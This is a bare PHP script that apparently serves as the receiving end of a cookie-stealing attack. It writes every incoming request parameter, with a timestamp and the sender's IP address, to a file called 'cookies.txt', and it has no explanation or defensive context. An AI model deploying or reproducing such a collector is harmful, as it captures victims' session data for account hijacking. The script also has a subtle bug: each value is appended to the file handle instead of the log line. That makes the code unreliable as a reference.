<?
$out=fopen("cookies.txt","a");
if($out==NULL) die("ouch!");
foreach($_REQUEST as $k=>$v){
	$log=date("r",time())."|";
	$log.=$_SERVER["REMOTE_ADDR"]."|";
	$log.="$k";
	if(strlen($v)) $out.="|$v";
	$log.="\n";
	fputs($out,$log);
}
fclose($out);
?>
